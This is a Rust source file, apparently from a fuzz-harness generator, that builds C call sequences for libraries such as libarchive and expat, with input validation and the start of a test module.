/// OSS-Fuzz harness. Caps keep corrupt, highly-compressed inputs from spending
/// an unbounded amount of time in one testcase.
fn libarchive_expert_stream_pump(
    args: &GenerateCSequenceArgs,
    op_steps: &[CSequenceStepEmission],
) -> Option<CExpertStreamPump> {
    if !is_exact_libarchive_reader_open(&args.target.name) {
        return None;
    }
    let mut open_step = op_steps
        .iter()
        .find(|step| step.name == args.target.name)?
        .clone();
    let mut header_step = op_steps
        .iter()
        .find(|step| step.name == "archive_read_next_header")?
        .clone();
    let mut data_step = op_steps
        .iter()
        .find(|step| step.name == "archive_read_data")?
        .clone();
    let mut skip_step = op_steps
        .iter()
        .find(|step| {
            step.name == "archive_read_data_skip"
                && step.return_type_present
                && step.params.is_empty()
        })
        .cloned();
    if !(open_step.return_type_present
        && header_step.return_type_present
        && data_step.return_type_present)
    {
        return None;
    }
    // `archive_read_data` has the exact public `(archive *, void *, size_t)`
    // signature. Use one small scratch buffer for the whole drain, matching the
    // maintained expert harness. The generic output-pair decoder would allocate
    // and free a ~64 KiB heap block on every read call—up to 4096 times per
    // entry—which burns fuzzing throughput without adding input entropy.
    if data_step.params.len() != 2
        || canonical_c_type(&data_step.params[0].c_type) != "void *"
        || !is_length_param(&data_step.params[1].c_type)
    {
        return None;
    }

    // The pump always owns/drives the primary reader. Receiver selection is a
    // sequence-program feature and has no place in this fixed protocol.
    for step in [&mut open_step, &mut header_step, &mut data_step] {
        step.receiver = if args.init_returns_handle || args.init_out_handle_argument.is_some() {
            "_gf_handle".to_owned()
        } else {
            "&_gf_handle".to_owned()
        };
        step.receiver_selector = None;
    }
    if let Some(step) = &mut skip_step {
        step.receiver = if args.init_returns_handle || args.init_out_handle_argument.is_some() {
            "_gf_handle".to_owned()
        } else {
            "&_gf_handle".to_owned()
        };
        step.receiver_selector = None;
    }

    Some(CExpertStreamPump {
        open_step,
        header_step,
        data_step,
        skip_step,
        data_buffer_name: "_gf_archive_data_buffer".to_owned(),
        data_buffer_bytes: 4096,
        entry_cap: 256,
        data_cap: 4096,
    })
}

fn is_exact_libarchive_reader_open(name: &str) -> bool {
    matches!(
        name,
        "archive_read_open_memory"
            | "archive_read_open_memory2"
            | "archive_read_open_file"
            | "archive_read_open_filename"
            | "archive_read_open_filename_w"
            | "archive_read_open_filenames"
            | "archive_read_open_filenames_w"
    )
}

fn is_exact_libarchive_file_reader_open(name: &str) -> bool {
    matches!(
        name,
        "archive_read_open_file"
            | "archive_read_open_filename"
            | "archive_read_open_filename_w"
            | "archive_read_open_filenames"
            | "archive_read_open_filenames_w"
    )
}

fn strip_sequence_callback_typedefs(step: &mut CSequenceStepEmission) {
    step.params = std::mem::take(&mut step.params)
        .into_iter()
        .map(strip_redundant_callback_typedef)
        .collect();
}

fn set_sequence_callback_action(param: &mut CParamEmission, active: bool) -> bool {
    let Some(support) = param.support.as_mut() else {
        return false;
    };
    if !support.contains("GOVFUZZ_CALLBACK_OBSERVE") {
        return false;
    }
    if !active {
        *support = support.replace("GOVFUZZ_CALLBACK_OBSERVE", "GOVFUZZ_CALLBACK_IGNORE");
    }
    active
}

fn disable_sequence_callback_actions(step: &mut CSequenceStepEmission) {
    for param in &mut step.params {
        set_sequence_callback_action(param, false);
    }
}

fn split_c_compile_context(flags: &[String]) -> (Vec<String>, String, bool, String, String) {
    let mut compiler = None;
    let mut provenance = "none".to_owned();
    let mut dropped = "none".to_owned();
    let compile_flags = flags
        .iter()
        .filter_map(|flag| {
            if let Some(value) = flag.strip_prefix(BUILD_CONTEXT_COMPILER_PREFIX) {
                compiler = Some(value.to_owned());
                None
            } else if let Some(value) = flag.strip_prefix(BUILD_CONTEXT_PROVENANCE_PREFIX) {
                provenance = value.to_owned();
                None
            } else if let Some(value) = flag.strip_prefix(BUILD_CONTEXT_DROPPED_PREFIX) {
                dropped = value.to_owned();
                None
            } else {
                // Single-quote a flag that needs it. A CMake version-comparison
                // define (`-DLLAMA_VERSIONS=>=3`) is legitimate but its `>` would
                // redirect if emitted bare into the recipe; `validate_*` has
                // already refused anything no quoting can make safe.
                Some(crate::build_safety::recipe_token(flag))
            }
        })
        .collect();
    let compiler = compiler.unwrap_or_else(|| "clang".to_owned());
    let leaf = Path::new(&compiler)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(&compiler)
        .to_ascii_lowercase();
    let compiler_is_gcc =
        leaf == "gcc" || leaf.starts_with("gcc-") || leaf == "g++" || leaf.starts_with("g++-");
    (
        compile_flags,
        compiler,
        compiler_is_gcc,
        provenance,
        dropped,
    )
}

/// Mark ops that return a NEW handle derived from the live one, and give every
/// op a receiver expression that can select the derived object.
///
/// libexpat's `XML_ExternalEntityParserCreate(parentParser, ...)` is the shape:
/// a child built from a still-live parent, whose own subsystem is reachable no
/// other way. Measured on expat, driving derived parsers was worth +594 library
/// lines — more than any other single technique in the ablation.
///
/// The receiver is chosen per call from one input byte and only while a derived
/// object exists, so an unproductive prefix behaves exactly as before.
fn mark_derived_handle_producers(
    op_steps: &mut [CSequenceStepEmission],
    handle_pointer: &str,
    receiver_is_pointer_value: bool,
) -> bool {
    let normalized = handle_pointer
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    let mut any = false;
    for step in op_steps.iter_mut() {
        let produced = emit_c_type(step.return_type.trim());
        let produced = produced.split_whitespace().collect::<Vec<_>>().join(" ");
        if step.return_type_present && produced == normalized {
            step.produces_derived_handle = true;
            // A create/new-named method that RETURNS the handle type is a child
            // producer, not a re-opener of the primary object. Name-based role
            // classification labels Expat's ExternalEntityParserCreate as Open;
            // retaining that role gates it on the parent being dead, making the
            // child path impossible and then incorrectly marks the parent live.
            step.role = CStepRole::Operation;
            any = true;
        }
    }
    if any {
        let primary = if receiver_is_pointer_value {
            "_gf_handle"
        } else {
            "&_gf_handle"
        };
        for (index, step) in op_steps.iter_mut().enumerate() {
            step.receiver =
                format!("((_gf_derived_live && (_gf_recv{index} & 1)) ? _gf_derived : {primary})");
            step.receiver_selector = Some(format!("_gf_recv{index}"));
        }
    }
    any
}

/// A typed slot carrying an op's return value to a later op's argument.
#[derive(Debug, Clone, Serialize)]
pub(crate) struct CThreadSlot {
    /// Identifier-safe suffix for the generated variable names.
    slug: String,
    /// The C type the slot holds.
    c_type: String,
}

/// Slugify a C type into something usable in an identifier.
fn slot_slug(c_type: &str) -> String {
    let mut out = String::new();
    for ch in c_type.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch);
        } else if !out.ends_with('_') {
            out.push('_');
        }
    }
    out.trim_matches('_').to_owned()
}

/// A return type is threadable when some op both PRODUCES it and some op
/// CONSUMES it as a parameter.
///
/// Status ints are excluded: a `0 == success` code is a control signal, not a
/// value the API passes back in — feeding it as an argument would be noise, and
/// the loop already gates on it.
fn thread_slots_for(
    op_steps: &[CSequenceStepEmission],
    declared: &[CLifecycleStep],
) -> Vec<CThreadSlot> {
    // Parameter types come from the DECLARED steps, not the emissions: a decoder
    // may normalise `pool_id` to its underlying `unsigned long`, and comparing
    // a declared return spelling against a normalised parameter spelling never
    // matches.
    let declared_param_types: Vec<String> = declared
        .iter()
        .flat_map(|step| step.params.iter())
        .map(|param| emit_c_type(&param.c_type).trim().to_owned())
        .collect();
    let mut slots: Vec<CThreadSlot> = Vec::new();
    for producer in op_steps {
        if !producer.return_type_present || producer.is_status_return {
            continue;
        }
        let produced = emit_c_type(producer.return_type.trim());
        let produced = produced.trim();
        if produced.is_empty() || produced == "void" {
            continue;
        }
        let consumed = declared_param_types.iter().any(|ty| ty == produced);
        if !consumed {
            continue;
        }
        let slug = slot_slug(produced);
        if slug.is_empty() || slots.iter().any(|slot| slot.slug == slug) {
            continue;
        }
        slots.push(CThreadSlot {
            slug,
            c_type: produced.to_owned(),
        });
    }
    slots
}

/// Rewrite each consuming parameter so it can take the live slot value instead
/// of a freshly decoded one, chosen per call from one input byte.
///
/// The freshly decoded value is still emitted and still the default: threading
/// ADDS the ability to pass back a value the API produced, it does not remove
/// the ability to pass an arbitrary one. A slot is only read once something has
/// stored into it, so an unthreaded prefix behaves exactly as before.
fn apply_result_threading(
    op_steps: &mut [CSequenceStepEmission],
    declared: &[CLifecycleStep],
    slots: &[CThreadSlot],
) {
    if slots.is_empty() {
        return;
    }
    for step in op_steps.iter_mut() {
        let produced = if step.return_type_present {
            emit_c_type(step.return_type.trim()).trim().to_owned()
        } else {
            String::new()
        };
        step.produces_slot = slots
            .iter()
            .find(|slot| slot.c_type == produced)
            .map(|slot| slot.slug.clone());
        // Match this emission back to its declaration by NAME so parameter types
        // are read from the source spelling rather than a normalised decoder one.
        let declared_params = declared
            .iter()
            .find(|d| d.name == step.name)
            .map(|d| d.params.as_slice())
            .unwrap_or(&[]);
        for (index, param) in step.params.iter_mut().enumerate() {
            let declared_type = declared_params
                .get(index)
                .map(|p| emit_c_type(&p.c_type).trim().to_owned())
                .unwrap_or_default();
            let Some(slot) = slots.iter().find(|slot| slot.c_type == declared_type) else {
                continue;
            };
            let slug = &slot.slug;
            let choose = format!("{}_use{index}", param.arg);
            param.decl = format!(
                "{}; int {choose} = (int)gf_u8(&Cur)",
                param.decl.trim_end_matches(';')
            );
            // Live-gated: an empty slot must never be passed as if it held a
            // value the API returned.
            param.arg = format!(
                "((_gf_slot_{slug}_live && ({choose} & 1)) ? _gf_slot_{slug} : {})",
                param.arg
            );
        }
    }
}

fn build_c_sequence_step_emission(
    step: &CLifecycleStep,
    prefix: &str,
    result_name: &str,
    registry: &TypeRegistry,
    limits: DecoderLimits,
    zero_success_status: bool,
) -> Result<CSequenceStepEmission, HarnessGenError> {
    let scoped_params = step
        .params
        .iter()
        .enumerate()
        .map(|(index, param)| CParameter {
            name: scoped_c_param_name(prefix, index, &param.name),
            c_type: crate::c_decoders::strip_type_decoration(&param.c_type),
        })
        .collect::<Vec<_>>();
    // The sequence path passes an empty lifecycle table, so the opaque-handle
    // stack-alloc gate (GAP #6) is never reached here; no completeness oracle needed.
    // `variadic: false` — a lifecycle drive-step call site has no ellipsis context
    // to recover, and its trailing `char *` (if any) is an ordinary string.
    let mut params = build_param_decoders(
        &scoped_params,
        registry,
        &[],
        None,
        false,
        false,
        limits,
        &step.name,
        // The sequence lifecycle-step path is not part of the force-fuzz
        // direct-harness flow; keep its emission unchanged.
        false,
    )?;
    // #468: the lifecycle handle is param 0 of the function — passed as the single
    // `&_gf_handle` element and dropped from `step.params` by `c_lifecycle_function
    // _to_step`'s `skip(1)`. A length param that DESCRIBES the handle (a `strlen`-
    // style count immediately following it, now the first decoded param) is thus
    // orphaned: `build_param_decoders` sees no preceding buffer and decodes it as an
    // arbitrary `gf_i64`, so `op(&_gf_handle, strlen, ...)` reads `strlen` bytes out
    // of a 1-element handle (e.g. `utf8proc_decompose`) — a spurious heap-buffer-
    // overflow (#468). Bound that leading length to the handle's own size: a length
    // no larger than the buffer can never over-read, and the handle is memset to 0
    // so it is also a valid NUL-terminated empty string. The cursor consumption is
    // unchanged (`gf_bounded_length` reads the same `gf_i64`), so the corpus format
    // is stable. Fires ONLY for a leading length-named scalar, so ordinary struct-
    // handle lifecycle ops (whose first op param is a value, not a handle length)
    // are untouched.
    if let (Some(first_param), Some(first_emit)) = (step.params.first(), params.first_mut()) {
        let resolves_length = is_length_param(&first_param.c_type)
            || registry_resolves_to_length(&first_param.c_type, registry);
        if resolves_length && looks_like_count_name(&first_param.name) {
            let ty = crate::c_decoders::strip_type_decoration(&first_param.c_type);
            first_emit.decl = format!(
                "{ty} {arg} = ({ty})gf_bounded_length(&Cur, 0, sizeof _gf_handle)",
                arg = first_emit.arg
            );
        }
    }
    // Same decoration strip as the direct-call path: a lifecycle step's return
    // type can carry an export macro (e.g. `CJSON_PUBLIC(cJSON *)`) that becomes
    // an illegal `__declspec(dllexport)` on the local `_gf_stepN_result` var.
    let return_type = crate::c_decoders::strip_type_decoration(step.return_type.trim());
    let return_type_present = !return_type.is_empty() && !c_return_is_void(&return_type);
    // A signed integer is not universally a 0==success status. Many expert-
    // harness operations return positive progress (`read`) or a positive success
    // enum (`XML_Parse`). Only lifecycle sites whose role establishes zero-success
    // semantics ask for status handling.
    let is_status_return =
        zero_success_status && return_type_present && c_type_is_status_int(&return_type);
    Ok(CSequenceStepEmission {
        name: step.name.clone(),
        params,
        return_type: if return_type_present {
            return_type
        } else {
            "void".to_owned()
        },
        return_type_present,
        is_status_return,
        role: step.role,
        produces_slot: None,
        produces_derived_handle: false,
        receiver: "&_gf_handle".to_owned(),
        receiver_selector: None,
        result_name: result_name.to_owned(),
        marks_target: false,
        callback_context_arg: None,
        condition: None,
    })
}

fn build_c_protocol_step_emission(
    observed: &CProtocolStep,
    prefix: &str,
    result_name: &str,
    registry: &TypeRegistry,
    limits: DecoderLimits,
    receiver: &str,
    preceding: &[CSequenceStepEmission],
) -> Result<CSequenceStepEmission, HarnessGenError> {
    if observed.step.params.len() != observed.args.len() {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "mined protocol call '{}' has {} argument recipes for {} parameters",
            observed.step.name,
            observed.args.len(),
            observed.step.params.len()
        )));
    }
    if matches!(observed.step.role, CStepRole::Open | CStepRole::Close) {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "mined protocol call '{}' changes ownership/liveness",
            observed.step.name
        )));
    }
    let decoder_step = decoder_safe_protocol_step(&observed.step, &observed.args);
    let mut emission = build_c_sequence_step_emission(
        &decoder_step,
        prefix,
        result_name,
        registry,
        limits,
        false,
    )?;
    emission.receiver = if observed.has_receiver {
        receiver.to_owned()
    } else {
        String::new()
    };
    emission.receiver_selector = None;
    emission.marks_target = observed.marks_target;

    apply_c_protocol_condition(&mut emission, observed, preceding)?;
    apply_c_protocol_input_condition(&mut emission, observed)?;
    for recipe in &observed.args {
        let CProtocolArg::PriorResult(index) = recipe else {
            continue;
        };
        let producer = preceding.get(*index).ok_or_else(|| {
            HarnessGenError::UnsupportedParamType(format!(
                "result dependency index {index} is not an earlier step"
            ))
        })?;
        if producer.condition.is_some() && producer.condition != emission.condition {
            return Err(HarnessGenError::UnsupportedParamType(format!(
                "result from conditional call '{}' escapes its guard",
                producer.name
            )));
        }
    }

    apply_c_protocol_args(
        &mut emission,
        &observed.step.params,
        &observed.args,
        receiver,
        preceding,
    )?;
    Ok(emission)
}

fn apply_c_protocol_input_condition(
    emission: &mut CSequenceStepEmission,
    observed: &CProtocolStep,
) -> Result<(), HarnessGenError> {
    let Some(condition) = &observed.input_condition else {
        return Ok(());
    };
    if !safe_c_protocol_constant(&condition.value) || condition.value.trim_start().starts_with('-')
    {
        return Err(HarnessGenError::UnsupportedParamType(
            "invalid mined input-length condition".to_owned(),
        ));
    }
    let (source, bounds) = match &condition.source {
        CProtocolInputSource::Size => ("(uint64_t)Cur.size".to_owned(), None),
        CProtocolInputSource::Byte(index) if *index <= 4096 => (
            format!("(uint64_t)Cur.data[{index}]"),
            Some(format!("Cur.size > {index}u")),
        ),
        CProtocolInputSource::Byte(_) => {
            return Err(HarnessGenError::UnsupportedParamType(
                "invalid mined input-byte condition".to_owned(),
            ));
        }
    };
    let transformed = match &condition.transform {
        CProtocolInputTransform::Identity => source,
        CProtocolInputTransform::Modulo(modulus) if (1..=65_536).contains(modulus) => {
            format!("({source} % {modulus}u)")
        }
        CProtocolInputTransform::BitAnd(mask) => format!("({source} & {mask}u)"),
        CProtocolInputTransform::Modulo(_) => {
            return Err(HarnessGenError::UnsupportedParamType(
                "invalid mined input-length modulus".to_owned(),
            ));
        }
    };
    let operator = c_protocol_comparison_operator(condition.comparison);
    let comparison = format!("{transformed} {operator} {}", condition.value);
    let input = bounds.map_or(comparison.clone(), |bounds| {
        format!("{bounds} && ({comparison})")
    });
    emission.condition = Some(match emission.condition.take() {
        Some(existing) => format!("({existing}) && ({input})"),
        None => input,
    });
    Ok(())
}

fn apply_c_protocol_condition(
    emission: &mut CSequenceStepEmission,
    observed: &CProtocolStep,
    preceding: &[CSequenceStepEmission],
) -> Result<(), HarnessGenError> {
    let Some(condition) = &observed.condition else {
        return Ok(());
    };
    let Some(producer) = preceding.get(condition.producer_step) else {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "condition producer index {} is not an earlier step",
            condition.producer_step
        )));
    };
    if !producer.return_type_present {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "condition producer '{}' has no result",
            producer.name
        )));
    }
    if !safe_c_protocol_constant(&condition.value) {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "unsafe condition constant '{}'",
            condition.value
        )));
    }
    if let Some(mask) = &condition.bitmask {
        if !safe_c_protocol_constant(mask) {
            return Err(HarnessGenError::UnsupportedParamType(format!(
                "unsafe condition bitmask '{mask}'"
            )));
        }
    }
    let operator = c_protocol_comparison_operator(condition.comparison);
    let producer_value = condition.bitmask.as_ref().map_or_else(
        || producer.result_name.clone(),
        |mask| format!("({} & {mask})", producer.result_name),
    );
    emission.condition = Some(format!(
        "{} {} {}",
        producer_value, operator, condition.value
    ));
    Ok(())
}

fn c_protocol_comparison_operator(comparison: CProtocolComparison) -> &'static str {
    match comparison {
        CProtocolComparison::Equal => "==",
        CProtocolComparison::NotEqual => "!=",
        CProtocolComparison::Less => "<",
        CProtocolComparison::LessEqual => "<=",
        CProtocolComparison::Greater => ">",
        CProtocolComparison::GreaterEqual => ">=",
    }
}

/// Literal/input/receiver recipes replace the decoder completely, so an opaque
/// typedef at that position must not reject the whole observed call before the
/// replacement is applied (`XML_Char nsSep` with observed literal `'!'`). Feed
/// the decoder a harmless placeholder shape for those positions, then restore
/// the declaration's exact type in [`apply_c_protocol_args`].
fn decoder_safe_protocol_step(step: &CLifecycleStep, recipes: &[CProtocolArg]) -> CLifecycleStep {
    let mut safe = step.clone();
    for (param, recipe) in safe.params.iter_mut().zip(recipes) {
        param.c_type = match recipe {
            CProtocolArg::Decode => continue,
            CProtocolArg::InputData | CProtocolArg::InputDataOffset(_) => {
                "const unsigned char *".to_owned()
            }
            CProtocolArg::InputSize
            | CProtocolArg::InputSizeMinus(_)
            | CProtocolArg::InputSizeDivisor(_)
            | CProtocolArg::InputByte { .. } => "size_t".to_owned(),
            CProtocolArg::Receiver => "void *".to_owned(),
            CProtocolArg::PriorResult(_) => "int".to_owned(),
            CProtocolArg::Literal(_) => "int".to_owned(),
        };
    }
    safe
}

fn apply_c_protocol_args(
    emission: &mut CSequenceStepEmission,
    declared_params: &[CParameter],
    recipes: &[CProtocolArg],
    receiver: &str,
    preceding: &[CSequenceStepEmission],
) -> Result<(), HarnessGenError> {
    if emission.params.len() != declared_params.len() || declared_params.len() != recipes.len() {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "mined call '{}' argument recipe count does not match its declaration",
            emission.name
        )));
    }
    for ((param, declared), recipe) in emission.params.iter_mut().zip(declared_params).zip(recipes)
    {
        match recipe {
            CProtocolArg::Decode => {}
            CProtocolArg::InputData => {
                let c_type = emit_c_type(&declared.c_type);
                if !c_type.trim().ends_with('*') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-data argument '{}' is not pointer-shaped ({c_type})",
                        declared.name
                    )));
                }
                param.decl = format!("{c_type} {} = ({c_type})Cur.data", param.arg);
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::InputDataOffset(offset) => {
                if *offset > 4096 {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-data offset for '{}' is too large ({offset})",
                        declared.name
                    )));
                }
                let c_type = emit_c_type(&declared.c_type);
                if !c_type.trim().ends_with('*') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-data argument '{}' is not pointer-shaped ({c_type})",
                        declared.name
                    )));
                }
                param.decl = format!(
                    "{c_type} {} = ({c_type})(Cur.data + (Cur.size < {offset}u ? Cur.size : {offset}u))",
                    param.arg
                );
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::InputSize => {
                let c_type = emit_c_type(&declared.c_type);
                if c_type.contains('*') || c_type.contains('[') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-size argument '{}' is not scalar ({c_type})",
                        declared.name
                    )));
                }
                param.decl = format!("{c_type} {} = ({c_type})Cur.size", param.arg);
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::InputSizeMinus(offset) => {
                if *offset > 4096 {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-size offset for '{}' is too large ({offset})",
                        declared.name
                    )));
                }
                let c_type = emit_c_type(&declared.c_type);
                if c_type.contains('*') || c_type.contains('[') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-size argument '{}' is not scalar ({c_type})",
                        declared.name
                    )));
                }
                param.decl = format!(
                    "{c_type} {} = ({c_type})(Cur.size > {offset}u ? Cur.size - {offset}u : 0u)",
                    param.arg
                );
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::InputSizeDivisor(divisor) => {
                if !(2..=65_536).contains(divisor) {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "invalid mined input-size divisor {divisor}"
                    )));
                }
                let c_type = emit_c_type(&declared.c_type);
                if c_type.contains('*') || c_type.contains('[') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-size argument '{}' is not scalar ({c_type})",
                        declared.name
                    )));
                }
                param.decl = format!("{c_type} {} = ({c_type})(Cur.size / {divisor}u)", param.arg);
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::InputByte { index, mask } => {
                if *index > 4096 {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-byte index for '{}' is too large ({index})",
                        declared.name
                    )));
                }
                let c_type = emit_c_type(&declared.c_type);
                if c_type.contains('*') || c_type.contains('[') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined input-byte argument '{}' is not scalar ({c_type})",
                        declared.name
                    )));
                }
                let value = match mask {
                    Some(mask) => format!(
                        "((Cur.size > {index}u ? (uint64_t)Cur.data[{index}] : 0u) & {mask}u)"
                    ),
                    None => format!("(Cur.size > {index}u ? (uint64_t)Cur.data[{index}] : 0u)"),
                };
                param.decl = format!("{c_type} {} = ({c_type}){value}", param.arg);
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::Receiver => {
                let c_type = emit_c_type(&declared.c_type);
                if !c_type.trim().ends_with('*') {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "mined receiver argument '{}' is not pointer-shaped ({c_type})",
                        declared.name
                    )));
                }
                param.decl = format!("{c_type} {} = ({c_type}){receiver}", param.arg);
                param.c_type = c_type;
                param.free = None;
            }
            CProtocolArg::PriorResult(index) => {
                let producer = preceding.get(*index).ok_or_else(|| {
                    HarnessGenError::UnsupportedParamType(format!(
                        "result dependency index {index} is not an earlier step"
                    ))
                })?;
                if !producer.return_type_present {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "result dependency '{}' returns void",
                        producer.name
                    )));
                }
                let expected = canonical_c_type(&emit_c_type(&declared.c_type));
                let actual = canonical_c_type(&producer.return_type);
                if expected != actual {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "result dependency '{}' has type '{}' but '{}' expects '{}'",
                        producer.name, producer.return_type, emission.name, declared.c_type
                    )));
                }
                param.support = None;
                param.decl.clear();
                param.arg = producer.result_name.clone();
                param.c_type = emit_c_type(&declared.c_type);
                param.free = None;
            }
            CProtocolArg::Literal(value) => {
                if !safe_c_protocol_literal(value) {
                    return Err(HarnessGenError::UnsupportedParamType(format!(
                        "unsafe mined literal for '{}': {value}",
                        declared.name
                    )));
                }
                param.support = None;
                param.decl.clear();
                param.arg = value.clone();
                param.c_type = emit_c_type(&declared.c_type);
                param.free = None;
            }
        }
    }
    Ok(())
}

fn safe_c_protocol_literal(value: &str) -> bool {
    let value = value.trim();
    if matches!(value, "NULL" | "0" | "true" | "false") {
        return true;
    }
    if ((value.starts_with('"') && value.ends_with('"'))
        || (value.starts_with('\'') && value.ends_with('\'')))
        && value.len() >= 2
    {
        return !value.contains(['\n', '\r']);
    }
    let numeric = value.strip_prefix('-').unwrap_or(value);
    !numeric.is_empty()
        && numeric.chars().next().is_some_and(|ch| ch.is_ascii_digit())
        && numeric
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | 'x' | 'X'))
}

fn safe_c_protocol_constant(value: &str) -> bool {
    if safe_c_protocol_literal(value) {
        return true;
    }
    let value = value.trim();
    value.contains('_')
        && value
            .chars()
            .next()
            .is_some_and(|ch| ch.is_ascii_uppercase() || ch == '_')
        && value
            .chars()
            .all(|ch| ch.is_ascii_uppercase() || ch.is_ascii_digit() || ch == '_')
}

/// Build a constructor call whose return value IS the opaque handle. Lifecycle
/// discovery admits only neutral pointer/callback parameters for this form; call
/// them with NULL defaults just as an expert harness does (`XML_ParserCreate(NULL)`,
/// `archive_read_new()`) instead of decoding arbitrary invalid configuration
/// objects from the fuzz input.
fn build_c_returning_init_emission(
    step: &CLifecycleStep,
    result_name: &str,
    _registry: &TypeRegistry,
    _limits: DecoderLimits,
) -> Result<CSequenceStepEmission, HarnessGenError> {
    let mut params = Vec::with_capacity(step.params.len());
    for param in &step.params {
        let canonical = emit_c_type(&param.c_type);
        let lower = canonical.to_ascii_lowercase();
        if !(canonical.trim().ends_with('*')
            || lower.ends_with("_func")
            || lower.ends_with("_fn")
            || lower.ends_with("_callback")
            || lower.ends_with("_cb"))
        {
            return Err(HarnessGenError::UnsupportedParamType(format!(
                "returning constructor '{}' needs non-neutral parameter '{}' ({})",
                step.name, param.name, param.c_type
            )));
        }
        params.push(CParamEmission {
            support: None,
            decl: String::new(),
            arg: "NULL".to_owned(),
            c_type: canonical,
            free: None,
        });
    }
    let return_type = crate::c_decoders::strip_type_decoration(step.return_type.trim());
    let return_type_present = !return_type.is_empty() && !c_return_is_void(&return_type);
    if !return_type_present {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "returning constructor '{}' has no handle return value",
            step.name
        )));
    }
    Ok(CSequenceStepEmission {
        name: step.name.clone(),
        params,
        return_type,
        return_type_present: true,
        is_status_return: false,
        role: step.role,
        produces_slot: None,
        produces_derived_handle: false,
        receiver: String::new(),
        receiver_selector: None,
        result_name: result_name.to_owned(),
        marks_target: false,
        callback_context_arg: None,
        condition: None,
    })
}

/// Build a status-returning constructor that writes the opaque live handle
/// through one pointer-to-pointer argument. Constructor configuration remains
/// stable: pointer options use neutral values, while path-like opens receive an
/// in-memory name so fuzz bytes are reserved for the API under test.
fn build_c_out_handle_init_emission(
    step: &CLifecycleStep,
    output_argument: usize,
    result_name: &str,
) -> Result<CSequenceStepEmission, HarnessGenError> {
    if output_argument >= step.params.len() {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "out-handle constructor '{}' has no parameter {output_argument}",
            step.name
        )));
    }
    let mut params = Vec::with_capacity(step.params.len());
    for (index, param) in step.params.iter().enumerate() {
        let c_type = emit_c_type(&param.c_type);
        let arg = if index == output_argument {
            "&_gf_handle".to_owned()
        } else if c_type.trim().ends_with('*') {
            let lower_name = param.name.to_ascii_lowercase();
            if step.name.to_ascii_lowercase().contains("open")
                && (index == 0
                    || lower_name.contains("file")
                    || lower_name.contains("path")
                    || lower_name.contains("name"))
                && canonical_c_type(&c_type).contains("char")
            {
                "\":memory:\"".to_owned()
            } else {
                "NULL".to_owned()
            }
        } else if matches!(
            TypeRegistry::default().resolve(&c_type),
            TypeShape::Scalar(_) | TypeShape::Enum { .. }
        ) {
            "0".to_owned()
        } else {
            return Err(HarnessGenError::UnsupportedParamType(format!(
                "out-handle constructor '{}' needs non-neutral parameter '{}' ({})",
                step.name, param.name, param.c_type
            )));
        };
        params.push(CParamEmission {
            support: None,
            decl: String::new(),
            arg,
            c_type,
            free: None,
        });
    }
    let return_type = crate::c_decoders::strip_type_decoration(step.return_type.trim());
    let return_type_present = !return_type.is_empty() && !c_return_is_void(&return_type);
    if !return_type_present {
        return Err(HarnessGenError::UnsupportedParamType(format!(
            "out-handle constructor '{}' has no status return value",
            step.name
        )));
    }
    Ok(CSequenceStepEmission {
        name: step.name.clone(),
        params,
        return_type: return_type.clone(),
        return_type_present,
        is_status_return: c_type_is_status_int(&return_type),
        role: CStepRole::Open,
        produces_slot: None,
        produces_derived_handle: false,
        receiver: String::new(),
        receiver_selector: None,
        result_name: result_name.to_owned(),
        marks_target: false,
        callback_context_arg: None,
        condition: None,
    })
}

fn scoped_c_param_name(prefix: &str, index: usize, raw: &str) -> String {
    let mut out = prefix.to_owned();
    out.push('_');
    let mut saw_any = false;
    for ch in raw.chars() {
        if ch.is_ascii_alphanumeric() || ch == '_' {
            out.push(ch);
            saw_any = true;
        } else {
            out.push('_');
        }
    }
    if !saw_any {
        out.push('p');
        out.push_str(&index.to_string());
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;
    use std::time::{SystemTime, UNIX_EPOCH};

    #[test]
    fn count_name_recognizes_nbytes_but_not_byte_order() {
        // `nBytes` (tinyxml2 `Parse(const char*, size_t nBytes)`) is a buffer
        // length and must pair with the preceding buffer — else it is fuzzed
        // independently and overruns the buffer (a false heap-overflow).
        assert!(looks_like_count_name("nBytes"));
        assert!(looks_like_count_name("nbyte"));
        // Existing length names still pair.
        assert!(looks_like_count_name("len"));
        assert!(looks_like_count_name("numBytes"));
        assert!(looks_like_count_name("byteCount"));
        // ...but a byte-flavored NON-length must NOT be mistaken for a length.
        assert!(!looks_like_count_name("byteOrder"));
        assert!(!looks_like_count_name("byteOffset"));
        assert!(!looks_like_count_name("firstByte"));
    }

    fn temp_dir(name: &str) -> PathBuf {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let dir = std::env::temp_dir().join(format!("govfuzz-cgen-{name}-{nonce}"));
